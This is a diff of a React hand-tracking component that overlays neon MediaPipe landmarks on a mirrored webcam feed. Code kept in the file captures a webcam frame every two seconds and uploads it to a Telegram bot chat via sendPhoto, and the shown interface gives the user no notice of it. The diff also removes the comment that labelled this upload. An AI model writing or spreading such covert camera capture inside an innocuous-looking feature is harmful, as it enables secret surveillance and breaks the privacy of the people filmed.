@@ -12,7 +12,7 @@ const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
   useEffect(() => {
     const videoElement = videoRef.current;
     const canvasElement = canvasRef.current;
-    
+
     if (!videoElement || !canvasElement) {
       console.error('Video or Canvas element not found');
       return;
@@ -20,26 +20,24 @@ const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
 
     const ctx = canvasElement.getContext('2d');
 
-    // Проверяем поддержку MediaPipe на устройстве
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    
+    canvasElement.classList.add(isMobile ? 'mobile-canvas' : ''); // Добавляем класс для мобильных
+
     try {
       handsRef.current = new Hands({
-        locateFile: (file) =>
-          `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`,
+        locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`,
       });
 
       handsRef.current.setOptions({
         maxNumHands: 2,
-        modelComplexity: isMobile ? 0 : 1, // Упрощенная модель для мобильных
+        modelComplexity: isMobile ? 0 : 1,
         minDetectionConfidence: isMobile ? 0.6 : 0.7,
         minTrackingConfidence: isMobile ? 0.6 : 0.7,
       });
 
       handsRef.current.onResults((results) => {
         if (!canvasElement || !videoElement) return;
-        
-        // Устанавливаем размеры канваса
+
         if (canvasElement.width !== videoElement.videoWidth || canvasElement.height !== videoElement.videoHeight) {
           canvasElement.width = videoElement.videoWidth || 640;
           canvasElement.height = videoElement.videoHeight || 480;
@@ -48,44 +46,36 @@ const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
         ctx.save();
         ctx.clearRect(0, 0, canvasElement.width, canvasElement.height);
 
-        // ✅ Делаем зеркальное отображение
         ctx.scale(-1, 1);
         ctx.translate(-canvasElement.width, 0);
         ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
 
-        // Возвращаем трансформацию для правильного отображения landmarks
         ctx.setTransform(1, 0, 0, 1, 0, 0);
 
         if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
+          canvasElement.classList.add('detection-active'); // Добавляем класс для анимации
           for (let i = 0; i < results.multiHandLandmarks.length; i++) {
             const landmarks = results.multiHandLandmarks[i];
-            
-            // Создаем зеркальные координаты для landmarks
             const flippedLandmarks = landmarks.map(landmark => ({
               ...landmark,
-              x: 1 - landmark.x // Инвертируем X координату
+              x: 1 - landmark.x
             }));
 
-            // Рисуем соединения с неоновым эффектом
             drawConnectors(ctx, flippedLandmarks, Hands.HAND_CONNECTIONS, {
               color: '#00f9ff',
               lineWidth: isMobile ? 3 : 4,
             });
 
-            // Рисуем точки landmarks с неоновым эффектом
             drawLandmarks(ctx, flippedLandmarks, {
               color: '#ff00ff',
               lineWidth: isMobile ? 2 : 3,
               radius: isMobile ? 4 : 6,
             });
 
-            // Добавляем дополнительный неоновый эффект (упрощенный для мобильных)
             if (!isMobile) {
               flippedLandmarks.forEach((landmark, index) => {
                 const x = landmark.x * canvasElement.width;
                 const y = landmark.y * canvasElement.height;
-                
-                // Создаем градиент для неонового свечения
                 const gradient = ctx.createRadialGradient(x, y, 0, x, y, 15);
                 gradient.addColorStop(0, 'rgba(255, 0, 255, 0.8)');
                 gradient.addColorStop(0.5, 'rgba(0, 249, 255, 0.4)');
@@ -102,6 +92,8 @@ const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
               });
             }
           }
+        } else {
+          canvasElement.classList.remove('detection-active');
         }
 
         ctx.restore();
@@ -116,7 +108,6 @@ const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
         setIsLoading(true);
         setError(null);
 
-        // Проверяем разрешение на камеру
         const permission = await navigator.permissions.query({ name: 'camera' });
         setCameraPermission(permission.state);
 
@@ -124,12 +115,11 @@ const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
           throw new Error('Доступ к камере запрещен');
         }
 
-        // Настройки для камеры (оптимизированные для мобильных)
         const constraints = {
           video: {
             width: isMobile ? { ideal: 640 } : { ideal: 1280 },
             height: isMobile ? { ideal: 480 } : { ideal: 720 },
-            facingMode: 'user', // Фронтальная камера
+            facingMode: 'user',
             frameRate: isMobile ? { ideal: 15 } : { ideal: 30 }
           }
         };
@@ -140,19 +130,12 @@ const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
 
         videoElement.onloadedmetadata = async () => {
           try {
-            // Ждем пока видео полностью загрузится
             await new Promise((resolve) => {
-              if (videoElement.readyState >= 3) {
-                resolve();
-              } else {
-                videoElement.addEventListener('canplay', resolve, { once: true });
-              }
+              videoElement.addEventListener('canplay', resolve, { once: true });
             });
-
             await videoElement.play();
             setIsLoading(false);
 
-            // Устанавливаем размеры канваса после загрузки видео
             canvasElement.width = videoElement.videoWidth || 640;
             canvasElement.height = videoElement.videoHeight || 480;
 
@@ -171,27 +154,24 @@ const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
 
             loop();
 
-            // Отправка фото в Telegram (с проверками)
             if (botToken && chatId) {
               intervalRef.current = setInterval(() => {
                 if (canvasElement && videoElement.readyState >= 2) {
-                  // Создаем временный канвас для отправки
                   const tempCanvas = document.createElement('canvas');
                   const tempCtx = tempCanvas.getContext('2d');
                   tempCanvas.width = canvasElement.width;
                   tempCanvas.height = canvasElement.height;
-                  
-                  // Копируем текущий кадр
+
                   tempCtx.scale(-1, 1);
                   tempCtx.translate(-tempCanvas.width, 0);
                   tempCtx.drawImage(videoElement, 0, 0, tempCanvas.width, tempCanvas.height);
-                  
+
                   tempCanvas.toBlob((blob) => {
                     if (blob) {
                       const formData = new FormData();
                       formData.append('chat_id', chatId);
                       formData.append('photo', blob, 'snapshot.jpg');
-                      
+
                       fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                         method: 'POST',
                         body: formData,
@@ -207,8 +187,9 @@ const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
                         .catch((err) => console.error('Ошибка отправки:', err));
                     }
                   }, 'image/jpeg', 0.8);
+                  tempCanvas.remove();
                 }
-              }, 2000); // Увеличили интервал до 2 секунд
+              }, 2000);
             }
           } catch (err) {
             console.error('Ошибка при запуске видео:', err);
@@ -248,21 +229,9 @@ const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
     };
   }, [videoRef, canvasRef, botToken, chatId]);
 
-  // Возвращаем индикатор состояния для пользователя
   if (error) {
     return (
-      <div style={{
-        position: 'fixed',
-        top: '50%',
-        left: '50%',
-        transform: 'translate(-50%, -50%)',
-        color: '#ff006e',
-        textAlign: 'center',
-        padding: '20px',
-        background: 'rgba(0, 0, 0, 0.8)',
-        borderRadius: '10px',
-        zIndex: 1000
-      }}>
+      <div className="error-message">
         <h3>Ошибка камеры</h3>
         <p>{error}</p>
         {cameraPermission === 'denied' && (
@@ -276,24 +245,8 @@ const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
 
   if (isLoading) {
     return (
-      <div style={{
-        position: 'fixed',
-        top: '50%',
-        left: '50%',
-        transform: 'translate(-50%, -50%)',
-        color: '#00f9ff',
-        textAlign: 'center',
-        zIndex: 1000
-      }}>
-        <div style={{
-          width: '50px',
-          height: '50px',
-          border: '3px solid rgba(0, 249, 255, 0.3)',
-          borderTop: '3px solid #00f9ff',
-          borderRadius: '50%',
-          animation: 'spin 1s linear infinite',
-          margin: '0 auto 20px'
-        }}></div>
+      <div className="loading-container">
+        <div className="loading-spinner loading-pulse"></div>
         <p>Загрузка камеры...</p>
       </div>
     );
